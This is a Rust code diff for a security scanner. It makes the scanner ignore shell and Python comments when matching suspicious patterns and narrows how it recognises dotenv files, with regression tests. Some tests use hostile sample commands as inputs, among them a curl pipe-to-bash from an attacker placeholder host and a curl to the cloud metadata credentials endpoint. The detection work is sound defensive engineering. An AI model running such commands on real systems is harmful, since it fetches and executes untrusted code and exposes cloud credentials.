@@ -1,3 +1,4 @@
+use super::manifests::strip_inline_hash_comment;
 use super::ArtifactLink;
 use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
 use crate::detectors::patterns::{line_invokes_shell_or_interpreter, RE_SHELL_SOURCE};
@@ -12,6 +13,46 @@ use crate::findings::ArtifactKind;
 use crate::services::ArtifactOrchestratorService;
 use std::path::Path;
 
+/// Languages whose comment marker is `#` and whose comments must be
+/// stripped before pattern matching. Shell, Python, Ruby, Perl, and
+/// YAML all share this convention. Pre-fix the script orchestrator
+/// passed raw `content` to every detector, so a benign documentation
+/// comment like `echo done  # was: curl https://old/install.sh` would
+/// fire `SCRIPT_REMOTE_BINARY_DOWNLOAD` even though `curl` was never
+/// executed. The Makefile / Dockerfile orchestrators already strip
+/// inline `#` comments via [`strip_inline_hash_comment`]; this list
+/// keeps the script side aligned.
+const HASH_COMMENT_LANGUAGES: &[&str] = &[
+    "sh", "bash", "zsh", "ksh", "fish", "py", "rb", "pl", "yaml", "yml", "ps1",
+];
+
+/// Strip inline `#` comments from `content` for the languages in
+/// [`HASH_COMMENT_LANGUAGES`], preserving line structure (line count
+/// and column positions of pre-`#` content). The original content is
+/// still passed to detectors that need raw evidence text via the
+/// `original` argument; only the canonical lowercased view used for
+/// pattern matching is normalised here. JS / TS / Node files are left
+/// alone — their comment marker is `//` and would require a different
+/// stripper that doesn't collide with `https://`.
+fn strip_comments_for_detection(content: &str, language: &str) -> String {
+    if !HASH_COMMENT_LANGUAGES.contains(&language) {
+        return content.to_string();
+    }
+    let mut out = String::with_capacity(content.len());
+    let mut first = true;
+    for line in content.lines() {
+        if !first {
+            out.push('\n');
+        }
+        first = false;
+        out.push_str(strip_inline_hash_comment(line));
+    }
+    if content.ends_with('\n') {
+        out.push('\n');
+    }
+    out
+}
+
 pub(crate) fn analyze_script(
     artifact_orchestration: &ArtifactOrchestratorService,
     path: &Path,
@@ -23,15 +64,28 @@ pub(crate) fn analyze_script(
         .and_then(|ext| ext.to_str())
         .map(str::to_ascii_lowercase)
         .unwrap_or_default();
-    let lower = content.to_ascii_lowercase();
+    // Strip inline `#` comments BEFORE deriving the lowercase view so
+    // pattern matchers don't fire on commented-out tokens. We preserve
+    // line structure (line count + column positions of pre-`#` content)
+    // so line-tracked detectors stay accurate, and we feed the
+    // *stripped* content to the detectors as their `original` argument
+    // too — the `original_match_str` helper requires `lower.len() ==
+    // original.len()`, which only holds when both views are derived
+    // from the same source string.
+    let comment_stripped = strip_comments_for_detection(content, &language);
+    let lower = comment_stripped.to_ascii_lowercase();
     let mut findings = Vec::new();
 
     findings.extend(detect_remote_binary_downloads(
         &lower,
-        content,
+        &comment_stripped,
         &artifact_path,
     ));
-    findings.extend(detect_deferred_execution(&lower, content, &artifact_path));
+    findings.extend(detect_deferred_execution(
+        &lower,
+        &comment_stripped,
+        &artifact_path,
+    ));
     findings.extend(detect_node_process_exec(&lower, &language, &artifact_path));
     findings.extend(detect_python_exec_network(
         &lower,
@@ -76,13 +130,18 @@ pub(crate) fn analyze_script(
     ));
     findings.extend(detect_injection_patterns(
         &lower,
-        content,
+        &comment_stripped,
         &language,
         &artifact_path,
     ));
+    // Pass `comment_stripped` (not raw `content`) so the permission/network
+    // detector aligns with the rest of the pipeline above. Otherwise a line
+    // like `echo done  # was: chmod +x ./payload` would fire the install
+    // side-effect rule from a comment, the same FP class the comment-stripping
+    // pass exists to prevent.
     findings.extend(artifact_orchestration.permission_and_network_findings(
         path,
-        content,
+        &comment_stripped,
         ArtifactKind::ReferencedArtifact,
     ));
 
@@ -129,7 +188,7 @@ pub(crate) fn script_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> 
     if lower.contains("process.env")
         || lower.contains("os.environ")
         || lower.contains("getenv(")
-        || lower.contains(".env")
+        || references_dotenv_file(&lower)
         || lower.contains("access_token")
         || lower.contains("api_token")
         || lower.contains("auth_token")
@@ -244,7 +303,7 @@ pub(crate) fn script_relations(content: &str) -> Vec<ArtifactLink> {
     if lower.contains("process.env")
         || lower.contains("os.environ")
         || lower.contains("getenv(")
-        || lower.contains(".env")
+        || references_dotenv_file(&lower)
     {
         links.push(ArtifactLink {
             target: "secrets".to_string(),
@@ -252,6 +311,74 @@ pub(crate) fn script_relations(content: &str) -> Vec<ArtifactLink> {
         });
     }
     links
+}
+
+/// Whether `lower` (an already-`to_ascii_lowercase()`-d slice of script
+/// content) references a `.env` *dotenv file* — as opposed to incidentally
+/// containing the four bytes `.env` inside a longer identifier or
+/// filename.
+///
+/// Pre-fix the script orchestrator triggered `SecretAccess` /
+/// `AccessesSecrets` on `lower.contains(".env")`, which fired on a wide
+/// surface of benign content:
+///
+/// - sibling stems like `.envrc` (direnv config), `.envelope`,
+///   `.environment/...`, `.envconfig`, where `.env` is a prefix of the
+///   real filename;
+/// - identifiers like `MY_DOTENV_VAR=` or `_dotenv_path` that contain
+///   `.env` inside a larger word;
+/// - documentation prose like `"the .env file"` (which DOES indicate a
+///   dotenv reference, but only in narrative, not in executable code).
+///
+/// `process.env.X` and `os.environ` are already covered by their own
+/// substring branches in [`script_capabilities`] and [`script_relations`],
+/// so this helper only has to recognise the **dotenv file form**: an
+/// explicit `dotenv` library call OR the filename `.env` anchored as a
+/// path or quoted literal.
+///
+/// We require one of:
+///
+/// - `dotenv` / `load_dotenv` (the explicit library names),
+/// - `.env` immediately followed by a separator that ends the filename
+///   (`"`, `'`, end-of-string, whitespace, `:`, `,`, `)`, `;`),
+/// - `/.env` or `\.env` (an absolute or POSIX-style path),
+/// - `read .env` / `cat .env` (shell-form references),
+///
+/// none of which are produced by `.envrc`, `.envelope`, etc.
+fn references_dotenv_file(lower: &str) -> bool {
+    if lower.contains("dotenv") || lower.contains("load_dotenv") {
+        return true;
+    }
+    let mut search_start = 0;
+    while let Some(rel) = lower[search_start..].find(".env") {
+        let abs = search_start + rel;
+        let after = abs + ".env".len();
+        let next = lower[after..].chars().next();
+        let is_terminator = match next {
+            None => true,
+            Some(c) => matches!(
+                c,
+                '"' | '\'' | ' ' | '\t' | '\n' | ':' | ',' | ')' | ';' | '`'
+            ),
+        };
+        if is_terminator {
+            // Require either a path separator, a quote, or whitespace
+            // immediately before `.env` so we accept things like
+            // `"/.env"`, `'.env'`, `cat .env`, `read .env`, `open(".env")`,
+            // and reject `MY.ENV` style identifiers (also rejected on the
+            // suffix side above).
+            let before = lower[..abs].chars().next_back();
+            let before_ok = matches!(
+                before,
+                None | Some('"' | '\'' | '/' | '\\' | ' ' | '\t' | '(' | ',' | ':' | '`')
+            );
+            if before_ok {
+                return true;
+            }
+        }
+        search_start = abs + 1;
+    }
+    false
 }
 
 #[cfg(test)]
@@ -371,5 +498,231 @@ mod tests {
             .iter()
             .any(|c| c.capability == ArtifactCapability::ProcessExecution));
         assert!(relation_target_present(&links, "process"));
+    }
+
+    /// Contract: an inline `#` comment in a shell script MUST be
+    /// stripped before pattern matching. Pre-fix `analyze_script` fed
+    /// raw `content` to every detector, so a benign documentation
+    /// line like `echo done  # was: curl https://old/install.sh` fired
+    /// `SCRIPT_REMOTE_BINARY_DOWNLOAD` even though `curl` was never
+    /// executed. Mirrors the comment-aware contract of the Makefile
+    /// and Dockerfile orchestrators.
+    #[test]
+    fn analyze_script_skips_remote_download_inside_shell_comment() {
+        let path = std::path::Path::new("/pkg/install.sh");
+        let content = "echo done  # was: curl https://old/install.sh\n";
+        let service = ArtifactOrchestratorService::new();
+        let findings = analyze_script(&service, path, content);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "SCRIPT_REMOTE_BINARY_DOWNLOAD"),
+            "documentation comment must not fire SCRIPT_REMOTE_BINARY_DOWNLOAD; got {findings:?}",
+        );
+    }
+
+    /// Contract: same comment-stripping applies to Python scripts.
+    /// `# requests.get(...)` in a Python file is documentation, not
+    /// runtime behavior.
+    #[test]
+    fn analyze_script_skips_remote_download_inside_python_comment() {
+        let path = std::path::Path::new("/pkg/setup.py");
+        let content = "x = 1  # was using curl https://old/install.sh\n";
+        let service = ArtifactOrchestratorService::new();
+        let findings = analyze_script(&service, path, content);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "SCRIPT_REMOTE_BINARY_DOWNLOAD"),
+            "Python comment must not fire SCRIPT_REMOTE_BINARY_DOWNLOAD; got {findings:?}",
+        );
+    }
+
+    /// Contract: a real `curl ... | bash` outside any comment MUST
+    /// still fire. Negative-case regression so the comment fix
+    /// doesn't accidentally widen and silence legitimate detections.
+    #[test]
+    fn analyze_script_still_detects_uncommented_remote_download() {
+        let path = std::path::Path::new("/pkg/install.sh");
+        let content = "curl https://attacker.example/install.sh | bash\n";
+        let service = ArtifactOrchestratorService::new();
+        let findings = analyze_script(&service, path, content);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SCRIPT_REMOTE_BINARY_DOWNLOAD"),
+            "uncommented curl pipe-to-bash MUST still fire; got {findings:?}",
+        );
+    }
+
+    /// Contract: a `# was: curl 169.254.169.254/latest/meta-data` comment
+    /// in a shell script MUST NOT fire `METADATA_SERVICE_ACCESS` (or any
+    /// internal-network rule) coming out of `permission_and_network_findings`.
+    /// Pre-fix `analyze_script` passed RAW `content` to that detector even
+    /// though it had already comment-stripped the input for every other
+    /// detector above; the asymmetry re-introduced the FP class for the
+    /// permission/network path alone. This test pins both detectors on the
+    /// same comment input so the pipeline stays internally consistent.
+    #[test]
+    fn analyze_script_skips_internal_network_inside_shell_comment() {
+        let path = std::path::Path::new("/pkg/install.sh");
+        let content = "echo done  # was: curl 169.254.169.254/latest/meta-data\n";
+        let service = ArtifactOrchestratorService::new();
+        let findings = analyze_script(&service, path, content);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "METADATA_SERVICE_ACCESS"),
+            "comment must not fire METADATA_SERVICE_ACCESS; got {findings:?}",
+        );
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "INTERNAL_NETWORK_ACCESS"),
+            "comment must not fire INTERNAL_NETWORK_ACCESS; got {findings:?}",
+        );
+    }
+
+    /// Contract: an uncommented `curl 169.254.169.254/...` MUST still fire
+    /// the metadata-service rule. Negative-side regression so the
+    /// comment-stripping alignment doesn't accidentally widen and silence
+    /// real internal-network detections.
+    #[test]
+    fn analyze_script_still_detects_uncommented_metadata_target() {
+        let path = std::path::Path::new("/pkg/install.sh");
+        let content = "curl http://169.254.169.254/latest/meta-data/iam/\n";
+        let service = ArtifactOrchestratorService::new();
+        let findings = analyze_script(&service, path, content);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "METADATA_SERVICE_ACCESS"),
+            "uncommented metadata-service hit MUST still fire; got {findings:?}",
+        );
+    }
+
+    /// Contract: comment-stripping preserves line count so any future
+    /// line-tracked finding stays at the right line. Pin the helper
+    /// directly so a refactor can't silently switch to `\n`-joining
+    /// (which loses the trailing newline) or skip empty lines.
+    #[test]
+    fn strip_comments_for_detection_preserves_line_count() {
+        let content = "alpha\n# pure comment line\nbeta # inline\n";
+        let stripped = strip_comments_for_detection(content, "sh");
+        assert_eq!(
+            stripped.lines().count(),
+            content.lines().count(),
+            "line count MUST be preserved; got {stripped:?}",
+        );
+        assert_eq!(stripped.ends_with('\n'), content.ends_with('\n'));
+    }
+
+    /// Contract: languages without `#` comments (`js`, `ts`) are left
+    /// untouched. Stripping `//` would collide with `https://` and
+    /// produce false negatives, so the orchestrator deliberately
+    /// limits the strip to hash-comment languages.
+    #[test]
+    fn strip_comments_for_detection_leaves_javascript_untouched() {
+        let js = "const x = 'ok'; // comment\n";
+        let stripped = strip_comments_for_detection(js, "js");
+        assert_eq!(stripped, js, "`.js` content must round-trip unchanged");
+    }
+
+    /// Contract: `references_dotenv_file` MUST NOT classify benign
+    /// content that incidentally contains the four bytes `.env` as a
+    /// dotenv-file reference. Pre-fix `lower.contains(".env")` fired on
+    /// `.envrc` (direnv config), `.envelope`, `.environment/...`,
+    /// `.envconfig`, and identifiers like `MY_DOTENV_VAR=` —
+    /// over-emitting `SecretAccess` capability and `AccessesSecrets`
+    /// relation, which combined with `NetworkAccess` could trigger a
+    /// false `ARTIFACT_TAINT_SECRET_TO_EXTERNAL_NETWORK` finding on
+    /// completely benign code.
+    #[test]
+    fn references_dotenv_file_rejects_lookalike_filenames() {
+        let benign = [
+            "echo .envrc",
+            "load .envelope",
+            "open(\".environment/default.cfg\")",
+            "read .envconfig",
+            "MY_ENV=production",
+            "subscriber.envoy(message)",
+            "config = parse(.environments)",
+        ];
+        for sample in benign {
+            assert!(
+                !references_dotenv_file(&sample.to_ascii_lowercase()),
+                "must NOT classify lookalike as dotenv reference: {sample:?}"
+            );
+        }
+    }
+
+    /// Contract: `references_dotenv_file` MUST fire on a genuine dotenv
+    /// reference. Pin the canonical forms (library names, quoted
+    /// filename, shell-form path) so a future tightening doesn't
+    /// silently lose the positive signal.
+    #[test]
+    fn references_dotenv_file_fires_on_genuine_dotenv_references() {
+        let positive = [
+            "require('dotenv').config()",
+            "load_dotenv()",
+            "import dotenv",
+            "open(\".env\")",
+            "open('.env')",
+            "open(\"/etc/.env\")",
+            "cat .env",
+            "read .env",
+            "fs.readFile(\"./.env\")",
+            "with open('.env') as f:",
+        ];
+        for sample in positive {
+            assert!(
+                references_dotenv_file(&sample.to_ascii_lowercase()),
+                "must classify genuine dotenv reference: {sample:?}"
+            );
+        }
+    }
+
+    /// End-to-end contract: `script_capabilities` MUST NOT emit
+    /// `SecretAccess` on a script whose content references only `.envrc`
+    /// or other non-dotenv `.env*` filenames. Pre-fix this misclassified
+    /// direnv users; the false `SecretAccess` then propagated to the
+    /// taint engine if the script also did any network access.
+    #[test]
+    fn script_capabilities_does_not_emit_secret_access_for_envrc_lookalikes() {
+        let content =
+            "echo \"setting up direnv\"\nsource .envrc\nfetch https://example.invalid/x\n";
+        let caps = script_capabilities(content);
+        assert!(
+            !capability_present(&caps, ArtifactCapability::SecretAccess),
+            "direnv .envrc reference must NOT raise SecretAccess; got {caps:?}"
+        );
+    }
+
+    /// End-to-end contract: `script_relations` MUST NOT emit an
+    /// `AccessesSecrets` relation on a script that only mentions
+    /// `.envelope` (or other non-dotenv `.env*` lookalikes). Pre-fix
+    /// the bare substring fired here too, inflating the artifact graph.
+    #[test]
+    fn script_relations_does_not_emit_secrets_for_envelope_lookalikes() {
+        let content = "open_envelope = lambda f: parse(f)\nread .envelope\n";
+        let links = script_relations(content);
+        assert!(
+            !relation_target_present(&links, "secrets"),
+            ".envelope reference must NOT raise AccessesSecrets; got {links:?}"
+        );
+    }
+
+    /// End-to-end positive: a script that calls `load_dotenv()` MUST
+    /// still raise `SecretAccess` and `AccessesSecrets`. Pin the
+    /// happy path so the dotenv tightening doesn't silently lose
+    /// genuine secret-access signal.
+    #[test]
+    fn script_capabilities_still_raises_secret_access_for_load_dotenv() {
+        let content = "from dotenv import load_dotenv\nload_dotenv()\n";
+        let caps = script_capabilities(content);
+        assert!(capability_present(&caps, ArtifactCapability::SecretAccess));
+
+        let links = script_relations(content);
+        assert!(relation_target_present(&links, "secrets"));
     }
 }
